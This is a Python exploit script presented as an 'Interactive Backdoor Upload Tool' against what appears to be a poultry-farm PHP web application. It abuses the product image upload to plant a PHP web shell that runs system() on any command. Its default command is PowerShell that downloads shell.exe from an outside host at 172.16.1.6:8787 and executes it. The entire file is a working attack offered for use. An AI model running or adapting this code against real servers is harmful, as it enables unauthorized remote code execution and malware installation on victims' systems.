import requests
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

def upload_backdoor(target, command):
    upload_url = f"{target}/paultry/farm/product.php"
    shell_url = f"{target}/paultry/farm/assets/img/productimages/web-backdoor.php"

    # Prepare the payload
    payload = {
        'category': 'CHICKEN',
        'product': 'rce',
        'price': '100',
        'save': ''
    }

    # PHP code to be uploaded
    data = f"<?php system('{command}');?>"

    # Prepare the file data
    files = {
        'productimage': ('web-backdoor.php', data, 'application/x-php')
    }

    try:
        print("Sending POST request to:", upload_url)
        response = requests.post(upload_url, files=files, data=payload,
verify=False)

        if response.status_code == 200:
            print("\nResponse status code:", response.status_code)
            print(f"Shell has been uploaded successfully: {shell_url}")

            # Make a GET request to the shell URL to execute the command
            shell_response = requests.get(shell_url, verify=False)
            print("Command output:", Fore.GREEN +
shell_response.text.strip())
        else:
            print(f"Failed to upload shell. Status code:{response.status_code}")
            print("Response content:", response.text)
    except requests.RequestException as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    print(Fore.CYAN + "=" * 50)
    print(Fore.CYAN + "Interactive Backdoor Upload Tool")
    print(Fore.CYAN + "=" * 50)
    
    # Get IP address from user
    ip = input(Fore.YELLOW + "\nEnter target IP address: " + Style.RESET_ALL).strip()
    
    # Get port from user
    port = input(Fore.YELLOW + "Enter target port (default: 80): " + Style.RESET_ALL).strip()
    if not port:
        port = "80"
    
    # Construct target URL
    target = f"http://{ip}:{port}"
    
    # Get command from user
    print(Fore.YELLOW + "\nEnter command to execute (default: powershell payload):")
    print(Fore.BLUE + "Example: powershell -Command \"Invoke-WebRequest http://172.16.1.6:8787/shell.exe -OutFile shell.exe; Start-Process shell.exe\"")
    command = input(Fore.YELLOW + "Command: " + Style.RESET_ALL).strip()
    
    if not command:
        command = "powershell -Command \"Invoke-WebRequest http://172.16.1.6:8787/shell.exe -OutFile shell.exe; Start-Process shell.exe\""
    
    # Confirm before proceeding
    print(Fore.RED + "\n" + "=" * 50)
    print(Fore.RED + "CONFIRMATION")
    print(Fore.RED + "=" * 50)
    print(f"Target URL: {target}")
    print(f"Command: {command}")
    confirm = input(Fore.YELLOW + "\nDo you want to proceed? (yes/no): " + Style.RESET_ALL).strip().lower()
    
    if confirm in ['yes', 'y']:
        upload_backdoor(target, command)
    else:
        print(Fore.RED + "Operation cancelled.")
